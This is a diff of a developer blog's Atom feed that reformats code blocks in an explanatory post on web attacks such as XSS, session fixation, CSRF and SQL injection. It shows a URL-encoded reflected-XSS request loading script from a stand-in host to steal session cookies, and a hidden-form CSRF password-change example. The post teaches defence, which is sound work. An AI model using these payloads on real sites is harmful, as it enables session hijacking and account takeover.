@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.4.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-04-04T19:49:46+03:00</updated><id>http://localhost:4000/</id><title type="html">achiral</title><subtitle>achiral offers consulting and custom software development services on the node.js and .NET stacks.
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.4.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-04-04T20:14:12+03:00</updated><id>http://localhost:4000/</id><title type="html">achiral</title><subtitle>achiral offers consulting and custom software development services on the node.js and .NET stacks.
 </subtitle><entry><title type="html">Reactivity And Immutability In React</title><link href="http://localhost:4000/immutability" rel="alternate" type="text/html" title="Reactivity And Immutability In React" /><published>2020-04-02T09:39:37+03:00</published><updated>2020-04-02T09:39:37+03:00</updated><id>http://localhost:4000/immutability</id><content type="html" xml:base="http://localhost:4000/immutability">&lt;p&gt;Before getting into library-specific details, it’s worth starting with a definition of what constitutes reactivity. A typical example would be an Excel spreadsheet: if a cell aggregates data from other cells, that cell instantly changes if we change a value in any of the aggregated cells. In reactive programming, if a variable A depends on B and C, a change in either B or C would also trigger a change in A. While there seems to be an ongoing debate whether React is truly reactive, there’s no doubt that the UI reacts to changes in the data model, even if parts of the model itself don’t react to other parts being changed, so from now on we’ll consider this definition of reactivity.&lt;/p&gt;
 
 &lt;p&gt;Since in most programming languages mutating an existing instance doesn’t notify other objects or the runtime of the change, a typical pattern is to use events or callbacks for this. As an example, Windows Presentation Foundation uses models that implement an interface called
@@ -440,9 +440,9 @@ What I did was add an empty div at the end of the parent container, like so:&lt;
 
 &lt;p&gt;An alternative is the &lt;em&gt;reflected&lt;/em&gt; (or non-persistent) XSS attack, whereby the user’s input is not stored in the database but returned in the same way it was inputted. It works like this: Say you have a page that allows you to search for products. The user types some text in the search box and clicks the search button which sends a GET request to the server.&lt;/p&gt;
 
-&lt;pre&gt;
+&lt;div class=&quot;highlight&quot;&gt;
 GET http://www.onlineshop.com?search=something
-&lt;/pre&gt;
+&lt;/div&gt;
 
 &lt;p&gt;If the site finds something, it returns a list of results, but if it doesn’t, it’s going to say&lt;/p&gt;
 
@@ -450,11 +450,11 @@ GET http://www.onlineshop.com?search=something
 
 &lt;p&gt;…which is just the original, unaltered string. A crafty attacker might see this vulnerability and might send an email to the user asking him to click on a link which for the search term in the query string, contains some nefarious script block. If the user clicks on the link (which is likely because most people don’t hover on links to see where they lead to), the application server won’t be able to find any result and will return with a &lt;em&gt;not found&lt;/em&gt; page containing the script rendered directly on the page.&lt;/p&gt;
 
-&lt;pre&gt;
+&lt;div class=&quot;highlight&quot;&gt;
 GET http://www.onlineshop.com?
   search=%3Cscript%2520src%3D%22http%3A%2F%2Fsomesite.com%2Fscript.js%22%3E%3C%2Fscript%3E
   HTTP/1.1
-&lt;/pre&gt;
+&lt;/div&gt;
 
 &lt;p&gt;This script can then hijack the session cookie, like in the previous example.&lt;/p&gt;
 
@@ -476,9 +476,9 @@ GET http://www.onlineshop.com?
 
 &lt;p&gt;A yet another way of accomplishing session hijacking is &lt;em&gt;session fixation&lt;/em&gt;. There are plenty of sites that accept a session ID in the URL, such as:&lt;/p&gt;
 
-&lt;pre&gt;
+&lt;div class=&quot;highlight&quot;&gt;
 http://www.website.com?sid=asb1sadasdasdan23123
-&lt;/pre&gt;
+&lt;/div&gt;
 
 &lt;p&gt;The reason why they do it is that a lot of users turn off their cookies, ironically, for security reasons. This, however, would open them up to scams, like somebody sending them an email which says:&lt;/p&gt;
 
@@ -495,13 +495,22 @@ Hey, click on http://www.website.com?sid=asb1sadasdasdan23123, and enter credit 
 
 &lt;p&gt;Let’s say a site exposes some functionality in the form of a web request, like so:&lt;/p&gt;
 
-&lt;pre&gt;
+&lt;div class=&quot;highlight&quot;&gt;
 GET https://www.thesite.com/account?password=val HTTP/1.1
-&lt;/pre&gt;
+&lt;/div&gt;
 
 &lt;p&gt;This example is a bit contrived and oversimplified, but you get the picture. If the attacker can get the user to click on a link which points to that link &lt;strong&gt;while logged in&lt;/strong&gt;, that’s going to have the effect of changing the password for the user to whatever the attacker wants. This link can be part of an email, or it can be part of a message on a public board or a website set up by the attacker, etc.&lt;/p&gt;
 
 &lt;p&gt;An action that changes the password will more likely be a POST than a GET, but that doesn’t make it CSRF-proof either, because a user can be tricked into submitting a form. Here’s how that would work: you could have a form with a hidden input like so:&lt;/p&gt;
+
+&lt;div class=&quot;margin-bottom&quot;&gt;
+&lt;pre&gt;&lt;code class=&quot;language-js line-numbers&quot;&gt;
+&amp;#x3C;form action=&amp;#x22;https://www.thesite.com/account&amp;#x22; method=&amp;#x22;POST&amp;#x22;&amp;#x3E;
+  &amp;#x3C;input type=&amp;#x22;hidden&amp;#x22; name=&amp;#x22;password&amp;#x22; value=&amp;#x22;val&amp;#x22;/&amp;#x3E;
+  &amp;#x3C;input type=&amp;#x22;submit&amp;#x22; value=&amp;#x22;Some tricky text&amp;#x22;/&amp;#x3E;
+&amp;#x3C;/form&amp;#x3E;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 
 &lt;script src=&quot;https://gist.github.com/toaderflorin/6862d6a60d2dc4418a38fd81ae69e5bd.js&quot;&gt;&lt;/script&gt;
 
@@ -516,7 +525,19 @@ GET https://www.thesite.com/account?password=val HTTP/1.1
 
 &lt;p&gt;For SQL injection to work, you’d have to be writing your SQL queries using string interpolation/concatenation.&lt;/p&gt;
 
-&lt;script src=&quot;https://gist.github.com/toaderflorin/e842b81f3e4d1fef85087134717a1571.js&quot;&gt;&lt;/script&gt;
+&lt;div class=&quot;margin-bottom&quot;&gt;
+&lt;pre&gt;&lt;code class=&quot;language-js line-numbers&quot;&gt;
+// this is the wrong way to do it
+connection.query($`SELECT * FROM users WHERE username={usr}`, (err, result) =&amp;gt; {
+  // do something
+})
+
+// use parameters instead
+connection.query('SELECT * FROM users WHERE username=?', [usr], (err, result) =&amp;gt; {
+  // do something
+})
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 
 &lt;p&gt;As you can see, the text fits nicely in the query. The way you get around this is by using parameters, which are supported by all database systems.&lt;/p&gt;</content><author><name></name></author><summary type="html">I can testify that a lot of people confided in me they considered doing this (including yours truly) under the frustration of the bi-monthly administrative policies that mandated we change our workstation password:</summary></entry><entry><title type="html">CORS Made Simple</title><link href="http://localhost:4000/cors-made-simple" rel="alternate" type="text/html" title="CORS Made Simple" /><published>2018-09-09T06:39:37+03:00</published><updated>2018-09-09T06:39:37+03:00</updated><id>http://localhost:4000/cors-made-simple</id><content type="html" xml:base="http://localhost:4000/cors-made-simple">&lt;p&gt;CORS stands for &lt;em&gt;Cross-Origin Resource Sharing&lt;/em&gt; and if you’ve built rich client applications that communicate with an API via REST, you have probably crossed paths with something known as &lt;em&gt;same-origin policy&lt;/em&gt;. What this policy refers to is that an application cannot access resources via &lt;a href=&quot;https://www.w3schools.com/xml/xml_http.asp&quot;&gt;XMLHttpRequest&lt;/a&gt; or the &lt;a href=&quot;https://developers.google.com/web/updates/2015/03/introduction-to-fetch&quot;&gt;Fetch API&lt;/a&gt; that come from a different URL than where the page was originally served from.&lt;/p&gt;
 
